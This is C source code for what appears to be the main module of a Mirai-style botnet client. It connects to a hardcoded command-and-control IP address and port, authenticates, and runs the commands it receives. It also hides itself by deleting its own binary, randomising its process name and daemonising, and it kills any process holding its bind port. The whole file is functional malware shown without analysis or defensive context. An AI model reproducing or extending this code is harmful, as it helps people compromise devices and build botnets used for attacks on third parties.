#define _GNU_SOURCE

#include <stdlib.h>
#include <stdint.h>
#include <unistd.h>
#include <sys/prctl.h>
#include <signal.h>
#include <sys/socket.h>
#include <fcntl.h>
#include <arpa/inet.h>
#include <errno.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/wait.h>

#include "main.h"
#include "rand.h"
#include "resolve.h"

#if SCAN
#include "scan.h"
#endif

#include "command.h"
#include "entry.h"
#include "kill.h"

static int fd = -1;
char connected = FALSE;

static void disconnect_connection(void)
{
	if(fd != -1)
		close(fd);
	fd = -1;
	connected = FALSE;
	// Retry connection to the command & control server every 10 seconds
	sleep(10);
}

static void establish_connection(void)
{
	struct sockaddr_in addr;
	uint32_t _addr = 0;

	fd = socket(AF_INET, SOCK_STREAM, 0);
	if(fd == -1)
		return;

	NONBLOCK(fd);

	addr.sin_family = AF_INET;
	addr.sin_port = htons(61002);
	addr.sin_addr.s_addr = INET_ADDR(188,166,223,133);
	
	_addr = addr.sin_addr.s_addr;

	DEBUG_PRINT("Resolved command & control address %d.%d.%d.%d!\n", _addr & 0xff, (_addr >> 8) & 0xff, (_addr >> 16) & 0xff, (_addr >> 24) & 0xff);

	errno = 0;
	connect(fd, (struct sockaddr *)&addr, sizeof(addr));
	return;
}

static void flush_relay(struct relay *ptr)
{
	ptr->type = 0;

	ptr->b1 = 0;
	ptr->b2 = 0;
	ptr->b3 = 0;
	ptr->b4 = 0;
	ptr->b5 = 0;
	ptr->b6 = 0;

	memset(ptr->buf, 0, sizeof(ptr->buf));

	return;
}

static void build_auth(struct relay *data, char *ptr)
{
	char arch[64];
	uint16_t arch_len = 0;

	flush_relay(data);

	data->type = TYPE_AUTH;

	data->b1 = htons(128);
	data->b2 = htons(90);
	data->b3 = htons(87);
	data->b4 = htons(200);
	data->b5 = htons(240);
	data->b6 = htons(30);

	#ifdef ARCH
	strcpy(arch, ARCH);
	#endif

	#ifndef ARCH
	strcpy(arch, "unknown");
	#endif

    if (strlen(ptr) > 0)
        strcpy(arch, ptr);

	arch_len = strlen(arch);
	arch_len = htons(arch_len);

	memcpy(data->buf, &arch_len, sizeof(uint16_t));
	memcpy(data->buf + sizeof(uint16_t), arch, ntohs(arch_len));

	return;
}

static void send_query(void)
{
	struct relay data;

	//flush_relay(&data);

	data.type = TYPE_COMMAND;

	data.b1 = htons(8890);
	data.b2 = htons(5412);
	data.b3 = htons(6767);
	data.b4 = htons(1236);
	data.b5 = htons(8092);
	data.b6 = htons(3334);

	send(fd, &data, sizeof(struct relay), MSG_NOSIGNAL);

	return;
}

static void ensure_bind(uint32_t local_addr)
{
	struct sockaddr_in addr;
	int ret = 0;
	int e = 0;
	int tfd = 0;

	tfd = socket(AF_INET, SOCK_STREAM, 0);
	if(tfd == -1)
		exit(0);

	NONBLOCK(tfd);
	REUSE_ADDR(tfd);
	//REUSE_PORT(fd);

	addr.sin_family = AF_INET;
	addr.sin_port = htons(BIND_PORT);
	addr.sin_addr.s_addr = local_addr;

	errno = 0;

	ret = bind(tfd, (struct sockaddr *)&addr, sizeof(addr));
	e = errno;

	// Request process termination
	if(ret == -1)
		connect(tfd, (struct sockaddr *)&addr, sizeof(addr));

	if(ret == -1 && e == EADDRNOTAVAIL)
	{
		close(tfd);
		sleep(1);
		ensure_bind(LOCAL_ADDRESS);
		return;
	}

	if(ret == -1 && e == EADDRINUSE)
	{
		close(tfd);
		sleep(1);
		terminate_process_via_port(BIND_PORT);
		ensure_bind(LOCALHOST);
		return;
	}

	// Listen with the TCP backlog of 1
	listen(tfd, 1);

	return;
}

int main(int argc, char **args)
{
	int p = 0;
	int i = 0;
	struct relay auth;
	int pid1 = 0;
	int pid2 = 0;
	int len = 0;
  	char buf[32];
	int pgid = 0;
        char ident[64];
	#ifndef DEBUG
	sigset_t sigs;

	sigemptyset(&sigs);

	// Block SIGINT
    sigaddset(&sigs, SIGINT);
	sigprocmask(SIG_BLOCK, &sigs, NULL);
	
	// Delete self from the disk
	unlink(args[0]);
	
	// Change our working directory
	chdir("/");
	
	// Ignore SIGCHLD so that we dont have any defunct children in the process list and ignore SIGHUP so that we continue to live regardless of the status of the controlling terminal
	signal(SIGCHLD, SIG_IGN);
	signal(SIGHUP, SIG_IGN);
	#endif

	ensure_bind(LOCALHOST);
	memset(ident, 0, sizeof(ident));

   	 if(argc == 2 && strlen(args[1]) < sizeof(ident)) // Parse the input on arg1
    	{
        strcpy(ident, args[1]);
   	 }

	// Retrieve the local ipv4 address of the network adapter
    LOCAL_ADDRESS = local_addr();

	init_rand();
	init_entry();

	#ifndef DEBUG
	#ifdef ARCH
	write(STDOUT, "test\n", 6);
	#endif
	#ifndef ARCH
	write(STDOUT, "unknown", 7);
	write(STDOUT, "\n", 1);
	#endif
	#endif
	#ifndef DEBUG
	len = (rand_new() % (15 - 10) + 10);
	rand_string(buf, len);
	buf[len] = 0;
	memset(args[0], 0, strlen(args[0]));
	strcpy(args[0], buf);
	rand_string(buf, len);
	buf[len] = 0;
	prctl(PR_SET_NAME, buf);
	#endif

	#ifndef DEBUG
	// Fork ourselfs into the background we double fork to create a daemon and detach ourselves from running terminals.
	pid1 = fork();
	if(pid1)
		exit(1);
	pid2 = fork();
	if(pid2)
		exit(1);
	setsid();
	close(STDIN);
	close(STDOUT);
	close(STDERR);
	#endif

	#if SCAN
	init_scan();
	#endif

	// Terminate some processes already holding the port
	//init_kill();
	init_commands();

	DEBUG_PRINT("We have started under DEBUG mode!\n");

	build_auth(&auth, ident);

	while(TRUE)
	{
		fd_set read_set;
		fd_set write_set;
		struct timeval timeout;
		int ret = 0;
		int max_fds = 0;

		FD_ZERO(&read_set);
		FD_ZERO(&write_set);

		if(fd == -1)
			establish_connection();

		// Check if the socket was correctly initialized
		if(fd == -1)
		{
			p = 0;
			disconnect_connection();
			continue;
		}

		if(errno == ENETUNREACH || errno == EINVAL)
		{
			p = 0;
			DEBUG_PRINT("Attempted to reach a invalid or unreachable command & control address\n");
			disconnect_connection();
			continue;
		}

		if(connected)
			FD_SET(fd, &read_set);
		else
			FD_SET(fd, &write_set);

		timeout.tv_usec = 0;
		timeout.tv_sec = 10;

		ret = select(fd + 1, &read_set, &write_set, NULL, &timeout);
		if(ret == -1)
		{
			continue;
		}
		
		if(ret == 0)
		{
			p++;
			if(p == QUERY_TIME)
			{
				p = 0;
				send_query();
			}
		}

		if(FD_ISSET(fd, &write_set))
		{
			int err = 0;
			socklen_t err_len = sizeof(err);

			getsockopt(fd, SOL_SOCKET, SO_ERROR, &err, &err_len);
			if(err)
			{
				p = 0;
				disconnect_connection();
				continue;
			}

			send(fd, &auth, sizeof(struct relay), MSG_NOSIGNAL);
			DEBUG_PRINT("Successfully connected to the command & control server!\n");
			connected = TRUE;
		}

		if(!connected)
		{
			p = 0;
			disconnect_connection();
			continue;
		}

		if(FD_ISSET(fd, &read_set))
		{
			uint8_t tmp = 0;
            struct relay data;

            // Receive 1 byte
			errno = 0;
			ret = recv(fd, &tmp, sizeof(uint8_t), MSG_NOSIGNAL | MSG_PEEK);
			if(ret == -1)
			{
				// Determine if the resource was temporarily unavailable before we conclude a definite error
				if(errno == EINTR || errno == EWOULDBLOCK || errno == EAGAIN)
				{
					continue;
				}
				ret = 0;
			}

			if(ret == 0)
			{
				p = 0;
				disconnect_connection();
				continue;
			}

			// Actually receive in the data
			ret = recv(fd, &data, sizeof(struct relay), MSG_NOSIGNAL);
			if(ret == 0)
			{
				continue;
			}

			// Adventually parse the command data
			if(data.type == TYPE_COMMAND)
			{
				continue;
			}

			command_parse(data.buf, ret);
        }
	}
}
